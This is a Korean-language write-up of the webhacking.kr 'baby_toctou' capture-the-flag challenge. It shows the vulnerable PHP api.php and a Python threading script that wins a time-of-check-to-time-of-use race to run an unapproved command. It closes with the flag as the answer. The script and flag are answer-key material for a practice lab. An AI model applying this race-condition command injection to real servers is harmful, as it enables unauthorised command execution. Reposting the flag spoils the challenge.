### [소스코드]

```html
WebShell [Version 1.0.00000.001]

WebShell:/ $ 
```

<br>

### [소스코드 분석]
1. `Webshell:/$`뒤에 `cat api.php`입력
```html
WebShell [Version 1.0.00000.001]

WebShell:/ $ cat api.php
<?php
  // system($_GET['q']);
  if(!preg_match('/^[a-f0-9]+$/',$_COOKIE['baby_toctou'])){ $newCookie = uniqid().rand(1,999999999); setcookie("baby_toctou",$newCookie); $_COOKIE['baby_toctou'] = $newCookie; }
  $cmd = $_GET['q'];
  $myfile = fopen("user/{$_COOKIE['baby_toctou']}.sh", "w") or die("Unable to open file!");
  fwrite($myfile, $cmd);
  fclose($myfile);
  if(($cmd === "ls") || ($cmd === "cat api.php") || ($cmd === "cat index.php")){ // valid check
    sleep(1); // my server is small and weak
    system("sh ./user/{$_COOKIE['baby_toctou']}.sh");
  }
  else{
    echo <<<HELP
only "ls", "cat api.php", "cat index.php" allowed
HELP;
  }
?>
```
2. 위의 코드에서 `sleep(1);`때문에 Race Condition에 취약점이 발생
3. 파이썬 스크립트를 작성하여 Race Condition 취약점을 트리거 할 수 있음
    * 실행시킬때 오류가 발생하는 경우(VScode), 파이썬 requests모듈을 설치해야함
    * 설치방법 : 터미널 `pip install requests`
```py
import requests
import threading
 
url = "http://webhacking.kr:10019/api.php"
found_flag = False
 
headers = {
    "Cookie": "baby_toctou=645a7c1eda9d3388502911"
}
 
def send_request_1():
    params = {"q": "cat flag.php"}
    requests.get(url, headers=headers, params=params)
 
def send_request_2():
    global found_flag
    params = {"q": "ls"}
    res = requests.get(url, headers=headers, params=params)
    if "FLAG{" in res.text:
        found_flag = True
        print(res.text)
 
def exploit_race_condition():
    thread1 = threading.Thread(target=send_request_1)
    thread2 = threading.Thread(target=send_request_2)
 
    thread1.start()
    thread2.start()
 
    thread1.join()
    thread2.join()
 
if __name__ == "__main__":
    for i in range(10):
        if found_flag:
            break
        exploit_race_condition()
```
4. 스크립트를 실행시키면 FLAG값이 나옴
`<?php
  $flag = "FLAG{Mama_i_know_how_toctou_works}";
?>
`

<br>

* 정답 : FLAG{Mama_i_know_how_toctou_works}


  
  
  
